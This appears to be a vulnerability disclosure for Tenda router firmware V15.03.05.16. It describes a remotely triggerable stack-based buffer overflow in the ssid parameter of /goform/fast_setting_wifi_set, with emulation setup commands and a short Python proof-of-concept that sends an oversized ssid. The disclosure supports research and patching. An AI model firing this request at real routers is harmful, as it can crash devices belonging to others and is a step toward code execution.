form\_fast\_setting\_wifi\_ set ssid
------------------------------------

### Overview

*   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   固件下载网站： [AC6V1.0升级软件](https://www.tenda.com.cn/material/show/102661)

![](api/attachments/OLpMhoNjD8Vg/image/image.png)

### Affected version

**V15.03.05.16**

### Environmental simulation

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```

### Vulnerability details

The acting parameter ssid of the function form\_fast\_setting\_wifi\_set in the affected file /goform/fast\_setting\_wifi\_set causes a stack-based buffer overflow. The attack can be launched remotely

In the function form\_fast\_setting\_wifi\_set, it reads the user-supplied arguments into src and `strcpys`

![](api/attachments/OzhOMXwsr5cB/image/image.png)

### poc

```text-plain
import requests

IP = "192.168.142.100"
url = f"http://{IP}/goform/fast_setting_wifi_set?"
url += "ssid=" + "s" * 100

response = requests.get(url)
```

![](api/attachments/XJRH28oqmYZp/image/image.png)

